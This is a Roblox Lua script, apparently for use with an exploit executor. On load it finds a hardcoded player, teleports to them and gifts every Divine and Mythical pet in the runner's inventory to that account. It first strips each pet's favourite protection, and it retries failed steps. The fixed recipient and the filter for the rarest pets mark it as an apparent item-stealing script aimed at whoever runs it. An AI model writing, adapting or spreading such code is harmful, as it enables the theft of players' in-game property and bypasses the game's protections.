-- Pet Gifting Script with Retry Logic
-- Fixed version with proper unfavorite and retry systems

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local LocalPlayer = Players.LocalPlayer

-- Wait for game to load
if not game:IsLoaded() then
    game.Loaded:Wait()
end
wait(3)

-- Import services safely
local DataService, PetsService, PetGiftingService, TeleportUIController
local PetList, InventoryServiceEnums, FavoriteItemRemote

pcall(function() DataService = require(ReplicatedStorage.Modules.DataService) end)
pcall(function() PetsService = require(ReplicatedStorage.Modules.PetServices.PetsService) end)
pcall(function() PetGiftingService = require(ReplicatedStorage.Modules.PetServices.PetGiftingService) end)
pcall(function() TeleportUIController = require(ReplicatedStorage.Modules.TeleportUIController) end)
pcall(function() PetList = require(ReplicatedStorage.Data.PetRegistry.PetList) end)
pcall(function() InventoryServiceEnums = require(ReplicatedStorage.Data.EnumRegistry.InventoryServiceEnums) end)
pcall(function() FavoriteItemRemote = ReplicatedStorage:WaitForChild("GameEvents", 2):WaitForChild("Favorite_Item", 2) end)

-- Configuration
local Config = {
    TargetPlayerName = "CoolHolzBudd",
    DelayBetweenGifts = 3,
    DebugMode = true,
    MaxRetries = 3
}

-- State
local isRunning = false

-- Utility Functions
local function Log(message)
    if Config.DebugMode then
        print(os.date("%H:%M:%S") .. " -- [Gifting] " .. message)
    end
end

local function GetPlayerData()
    if not DataService then return {} end
    local success, data = pcall(function() return DataService:GetData() end)
    return success and data or {}
end

local function GetPetInventory()
    local data = GetPlayerData()
    if data.PetsData and data.PetsData.PetInventory then
        return data.PetsData.PetInventory.Data or {}
    end
    return {}
end

-- Pet Functions with Retry Logic
local function UnfavoritePetInBackpack(petId)
    if not FavoriteItemRemote or not InventoryServiceEnums then
        Log("❌ Favorite system not available")
        return false
    end

    Log("🔍 Looking for pet in backpack to unfavorite: " .. tostring(petId))
    local backpack = LocalPlayer.Backpack
    if not backpack then return false end

    for _, tool in pairs(backpack:GetChildren()) do
        if tool:IsA("Tool") then
            local toolPetUUID = tool:GetAttribute("PET_UUID")
            local toolUUID = tool:GetAttribute("UUID")
            
            if toolPetUUID == petId or toolUUID == petId then
                local isFavorited = tool:GetAttribute(InventoryServiceEnums.Favorite)
                if isFavorited then
                    Log("🔓 Pet is favorited, unfavoriting: " .. tostring(tool.Name))
                    
                    local success, error = pcall(function()
                        FavoriteItemRemote:FireServer(tool)
                    end)
                    
                    if success then
                        Log("✅ Sent unfavorite request for: " .. tostring(tool.Name))
                        wait(1.5) -- Wait for server processing
                        return true
                    else
                        Log("❌ Failed to unfavorite: " .. tostring(error))
                        return false
                    end
                else
                    Log("✅ Pet not favorited: " .. tostring(tool.Name))
                    return true
                end
            end
        end
    end
    
    Log("⚠️ Pet not found in backpack, assuming not favorited")
    return true
end

local function EquipPet(petId, maxRetries)
    if not PetsService then 
        Log("❌ PetsService not available")
        return false 
    end
    
    maxRetries = maxRetries or Config.MaxRetries
    
    for attempt = 1, maxRetries do
        Log("⚙️ Equip attempt " .. attempt .. "/" .. maxRetries .. " for pet: " .. tostring(petId))
        
        local success, error = pcall(function()
            PetsService:EquipPet(petId, 1)
        end)
        
        if success then
            Log("✅ Equipped pet on attempt " .. attempt .. ": " .. tostring(petId))
            return true
        else
            Log("❌ Equip attempt " .. attempt .. " failed: " .. tostring(error))
            
            if attempt < maxRetries then
                Log("🔄 Retrying equip in 2 seconds...")
                wait(2)
            end
        end
    end
    
    Log("❌ Failed to equip pet after " .. maxRetries .. " attempts: " .. tostring(petId))
    return false
end

local function MakePetIntoTool(petId, maxRetries)
    if not PetsService then 
        Log("❌ PetsService not available")
        return false 
    end
    
    maxRetries = maxRetries or Config.MaxRetries
    
    for attempt = 1, maxRetries do
        Log("🔧 Tool conversion attempt " .. attempt .. "/" .. maxRetries .. " for pet: " .. tostring(petId))
        
        local success, error = pcall(function()
            PetsService:UnequipPet(petId)
        end)
        
        if success then
            Log("✅ Converted to tool on attempt " .. attempt .. ": " .. tostring(petId))
            return true
        else
            Log("❌ Tool conversion attempt " .. attempt .. " failed: " .. tostring(error))
            
            if attempt < maxRetries then
                Log("🔄 Retrying conversion in 1 second...")
                wait(1)
            end
        end
    end
    
    Log("❌ Failed to convert to tool after " .. maxRetries .. " attempts: " .. tostring(petId))
    return false
end

local function WaitForPetTool(petId, maxWait)
    maxWait = maxWait or 8
    local waited = 0
    
    Log("🔍 Waiting for pet tool to appear in character...")
    
    while waited < maxWait do
        local character = LocalPlayer.Character
        if character then
            -- Debug: Show all tools in character
            local toolsFound = {}
            for _, tool in pairs(character:GetChildren()) do
                if tool:IsA("Tool") then
                    local toolPetUUID = tool:GetAttribute("PET_UUID")
                    local toolUUID = tool:GetAttribute("UUID")
                    
                    table.insert(toolsFound, {
                        Name = tool.Name,
                        PET_UUID = toolPetUUID,
                        UUID = toolUUID
                    })
                    
                    if toolPetUUID == petId or toolUUID == petId then
                        Log("✅ Found matching pet tool: " .. tostring(tool.Name))
                        return tool
                    end
                end
            end
            
            if #toolsFound > 0 then
                Log("🔍 Tools in character:")
                for _, tool in ipairs(toolsFound) do
                    Log("  - " .. tostring(tool.Name) .. " (PET_UUID: " .. tostring(tool.PET_UUID) .. ", UUID: " .. tostring(tool.UUID) .. ")")
                end
            end
        end
        
        wait(0.5)
        waited = waited + 0.5
    end
    
    Log("❌ Pet tool not found after " .. waited .. "s (looking for ID: " .. tostring(petId) .. ")")
    return nil
end

local function GiftPet(targetPlayer)
    if not PetGiftingService or not targetPlayer then 
        Log("❌ Cannot gift - missing service or target")
        return false 
    end
    
    local success, error = pcall(function()
        PetGiftingService:GivePet(targetPlayer)
    end)
    
    if success then
        Log("✅ Gift request sent to: " .. tostring(targetPlayer.Name))
        return true
    else
        Log("❌ Gift failed: " .. tostring(error))
        return false
    end
end

-- Main Functions
local function FindTargetPlayer()
    for _, player in pairs(Players:GetPlayers()) do
        if player.Name == Config.TargetPlayerName then
            return player
        end
    end
    return nil
end

local function GetGiftablePets()
    local inventory = GetPetInventory()
    local pets = {}
    
    for petId, petData in pairs(inventory) do
        if petData and PetList and PetList[petData.PetType] then
            local petInfo = PetList[petData.PetType]
            local rarity = petInfo.Rarity
            
            -- Only Divine and Mythical
            if rarity == "Divine" or rarity == "Mythical" then
                table.insert(pets, {
                    id = petId,
                    name = petData.PetType,
                    rarity = rarity,
                    level = petData.Level or 1,
                    rarityValue = rarity == "Divine" and 6 or 5
                })
            end
        end
    end
    
    -- Sort by rarity (Divine first)
    table.sort(pets, function(a, b)
        return a.rarityValue > b.rarityValue
    end)
    
    return pets
end

local function ProcessPetGifting(targetPlayer)
    Log("🐕 Starting pet gifting to " .. targetPlayer.Name)
    isRunning = true
    
    local pets = GetGiftablePets()
    if #pets == 0 then
        Log("❌ No giftable pets found")
        isRunning = false
        return
    end
    
    Log("📋 Found " .. #pets .. " pets to gift")
    local giftedCount = 0
    
    for i, pet in ipairs(pets) do
        if not isRunning then
            Log("⏹️ Automation stopped")
            break
        end
        
        Log("🔄 Processing " .. i .. "/" .. #pets .. ": " .. pet.name .. " (" .. pet.rarity .. ", Level " .. pet.level .. ")")
        
        -- Step 1: Unfavorite in backpack if needed
        Log("🔓 Step 1: Checking favorites...")
        if not UnfavoritePetInBackpack(pet.id) then
            Log("❌ Failed to unfavorite, skipping pet: " .. pet.name)
            continue
        end
        
        -- Step 2: Equip pet (with retries)
        Log("⚙️ Step 2: Equipping pet...")
        if EquipPet(pet.id) then
            wait(2) -- Wait for equip to settle
            
            -- Step 3: Convert to tool (with retries)
            Log("🔧 Step 3: Converting to tool...")
            if MakePetIntoTool(pet.id) then
                wait(1) -- Wait for conversion
                
                -- Step 4: Wait for tool and gift
                Log("⏳ Step 4: Waiting for tool...")
                local tool = WaitForPetTool(pet.id, 8)
                if tool then
                    Log("🎁 Step 5: Gifting pet...")
                    if GiftPet(targetPlayer) then
                        giftedCount = giftedCount + 1
                        Log("🎉 Successfully gifted: " .. pet.name)
                        wait(3) -- Wait to see if gift went through
                        
                        -- Check if pet is gone from inventory
                        local currentInventory = GetPetInventory()
                        if not currentInventory[pet.id] then
                            Log("✅ Confirmed: " .. pet.name .. " no longer in inventory")
                        else
                            Log("⚠️ Warning: " .. pet.name .. " still in inventory")
                        end
                    else
                        Log("❌ Failed to gift: " .. pet.name)
                    end
                else
                    Log("❌ Tool not found for: " .. pet.name)
                    -- Try to re-equip for next attempt
                    pcall(function() EquipPet(pet.id) end)
                end
            else
                Log("❌ Failed to convert: " .. pet.name)
            end
        else
            Log("❌ Failed to equip: " .. pet.name)
        end
        
        Log("⏳ Waiting " .. Config.DelayBetweenGifts .. " seconds before next pet...")
        wait(Config.DelayBetweenGifts)
    end
    
    Log("🎯 Pet gifting completed! Gifted " .. giftedCount .. " out of " .. #pets .. " pets.")
    isRunning = false
end

-- Main Logic
local function Main()
    Log("🌱 Gifting system started, looking for: " .. Config.TargetPlayerName)
    
    while true do
        if not isRunning then
            local target = FindTargetPlayer()
            if target then
                Log("🎯 Found target: " .. target.Name)
                
                -- Teleport to target
                if TeleportUIController then
                    Log("📍 Teleporting to target...")
                    pcall(function()
                        TeleportUIController:Move(target.Character:GetPivot())
                    end)
                    wait(2)
                end
                
                -- Start gifting
                ProcessPetGifting(target)
                
                -- Wait before next check
                wait(30)
            else
                wait(5) -- Check every 5 seconds
            end
        else
            wait(1) -- Already running, wait
        end
    end
end

-- Start the system
spawn(Main)

-- Listen for target joining
Players.PlayerAdded:Connect(function(player)
    if player.Name == Config.TargetPlayerName then
        Log("🎯 Target player joined: " .. player.Name)
        wait(3) -- Give them time to load
        if not isRunning then
            spawn(function()
                local target = FindTargetPlayer()
                if target then
                    ProcessPetGifting(target)
                end
            end)
        end
    end
end)

Log("🚀 Gifting automation loaded with retry system!")
